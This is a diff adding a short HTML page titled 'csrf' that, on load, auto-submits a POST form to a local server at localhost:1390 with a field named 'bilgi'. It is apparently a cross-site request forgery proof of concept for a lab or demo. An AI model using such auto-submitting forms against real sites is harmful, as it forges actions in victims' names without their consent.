@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width" />
+    <title>csrf</title>
+</head>
+<body>
+    <form id="myxss" action="http://localhost:1390/" method="post">        
+        <input type="text" name="bilgi" value="csrf" />
+    </form>
+	
+	<script>	
+	document.getElementById("myxss").submit();
+	</script>
+</body>
+</html>
